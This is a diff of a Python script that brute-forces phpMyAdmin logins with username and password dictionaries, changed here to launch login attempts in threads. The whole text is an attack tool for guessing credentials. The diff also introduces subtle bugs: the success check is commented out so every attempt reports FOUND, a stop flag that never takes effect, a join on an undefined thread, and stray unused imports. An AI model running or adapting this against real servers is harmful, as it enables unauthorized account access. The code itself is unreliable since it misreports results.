@@ -1,11 +1,18 @@
 #!/usr/bin/env python3
+from ast import arg
+from concurrent.futures import thread
+import sys
 import requests
 import html
 import re
 import os
 import argparse
+import threading, time
+
+stop_flag = 0
 
 def login(url, username, password):
+	
 	for i in range(3):
 		try:
 			res = requests.get(url)
@@ -18,10 +25,35 @@ def login(url, username, password):
 			}
 			res = requests.post(url, cookies=cookies, data=data)
 			cookies = dict(res.cookies)
-			return 'pmaAuth-1' in cookies
+			#return 'pmaAuth-1' in cookies
+			print("[*] FOUND - %s / %s" % (username, password))
+			f = open("found.txt", "w")
+			f.write("%s / %s\n" % (username, password))
+			f.close()
+			stop_flag = 1
 		except:
 			pass
-	return False
+	print("[!] FAILED - %s / %s" % (username, password))
+
+
+def bruteforce(users, passwords, url):
+	for user in users:
+		for password in passwords:
+			try:
+				if stop_flag == 1:
+					t.join()
+					exit()
+				t = threading.Thread(target = login, args = (url, user, password))
+				t.start()	
+				time.sleep(0.2)
+			except KeyboardInterrupt: 
+				t.join()
+				print("Cancelling")
+				exit()
+				
+		t.join()	
+	
+				
 
 def main():
 	parser = argparse.ArgumentParser(description='e.g. python3 %s -url http://example.com/pma/ -user root -dict password.txt' % (os.path.basename(__file__)))
@@ -55,17 +87,10 @@ def main():
 		f.close()
 	except:
 		users = [args.user]
+	
+	bruteforce(users, passwords, url)
 
-	for user in users:
-		for password in passwords:
-			if login(url, user, password):
-				print("[*] FOUND - %s / %s" % (user, password))
-
-				f = open("found.txt", "w")
-				f.write("%s / %s\n" % (user, password))
-				f.close()
-			else:
-				print("[!] FAILED - %s / %s" % (user, password))
 
 if __name__ == '__main__':
 	main()
+	
